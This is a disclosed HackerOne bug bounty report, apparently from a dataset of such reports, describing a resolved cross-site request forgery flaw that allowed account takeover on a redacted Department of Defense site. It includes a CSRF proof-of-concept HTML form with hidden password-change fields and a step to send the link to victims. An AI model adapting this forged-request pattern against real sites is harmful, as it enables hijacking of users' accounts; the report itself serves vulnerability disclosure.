---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '987751'
original_report_id: '987751'
title: CSRF to account takeover in https://███████.mil/
weakness: Cross-Site Request Forgery (CSRF)
team_handle: deptofdefense
created_at: '2020-09-22T03:24:11.029Z'
disclosed_at: '2020-10-16T19:43:15.777Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 15
tags:
- hackerone
- cross-site-request-forgery-csrf
---

# CSRF to account takeover in https://███████.mil/

## Metadata

- HackerOne Report ID: 987751
- Weakness: Cross-Site Request Forgery (CSRF)
- Program: deptofdefense
- Disclosed At: 2020-10-16T19:43:15.777Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**Summary:**
Hello 
**Description:**

## Impact

## Step-by-step Reproduction Instructions

1. Go to  https://███.mil/ and login using your credintials
2. Now Click on change password
3. First turn the intercept of burp to on and enter your secondary email id and password and click on register password.

```
<html>
  <!-- CSRF PoC - kira-->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://████████.mil/scripts/wa.exe" method="POST">
      <input type="hidden" name="GETPW2" value="GETPW1" />
      <input type="hidden" name="Y" value="a█████" />
      <input type="hidden" name="p" value="████████" />
      <input type="hidden" name="q" value="███████" />
      <input type="hidden" name="X" value="" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

4: Now send the link to the victims
## Product, Version, and Configuration (If applicable)

██████

## Impact

It is a critical issue as i was able to takeover anyone account using this attack..

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
